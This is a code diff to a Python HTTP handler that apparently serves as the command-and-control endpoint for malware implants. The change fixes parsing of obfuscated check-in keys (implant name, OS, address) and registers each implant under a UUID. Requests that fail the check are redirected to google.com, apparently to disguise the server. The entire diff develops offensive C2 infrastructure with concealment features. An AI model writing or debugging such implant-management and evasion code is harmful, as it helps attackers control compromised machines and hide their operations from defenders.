@@ -26,14 +26,19 @@ def handle_connection_request(handler: BaseHTTPRequestHandler, match: dict):
         handler.end_headers()
         return
     
-    # normalize the obfuscation mapping: prefer obfuscation_map["generic"]["implant_info"] shape but support simple mapping
+    # Normalize the obfuscation mapping and extract real values from incoming data
     generic = obfuscation_map.get("generic", {})
     implant_info = generic.get("implant_info", {}) if isinstance(generic.get("implant_info", {}), dict) else {}
 
-    # try values from implant_info first (actual values), then from a flat generic mapping (names/keys)
-    name_val = implant_info.get("Name") or generic.get("name")
-    os_val = implant_info.get("os") or generic.get("os")
-    address_val = implant_info.get("address") or generic.get("address")
+    # Keys used by the client for name/os/address in the obfuscated payload
+    name_key = implant_info.get("Name") or generic.get("name")
+    os_key = implant_info.get("os") or generic.get("os")
+    address_key = implant_info.get("address") or generic.get("address")
+
+    # Actual values provided by the client
+    name_val = data.get(name_key) if data and name_key else None
+    os_val = data.get(os_key) if data and os_key else None
+    address_val = data.get(address_key) if data and address_key else None
 
     if data and name_val and os_val and address_val:
         userID = str(uuid.uuid4())
@@ -61,7 +66,7 @@ def handle_connection_request(handler: BaseHTTPRequestHandler, match: dict):
         handler.end_headers()
         handler.wfile.write(response_body)
     else:
-        logger.error("Invalid data format in connection request, redirecting.")
+        logger.error("Invalid data format in connection request (missing or unmapped obfuscated keys for Name/os/address), redirecting.")
         handler.send_response(302)
         handler.send_header('Location', 'https://www.google.com')
         handler.end_headers()
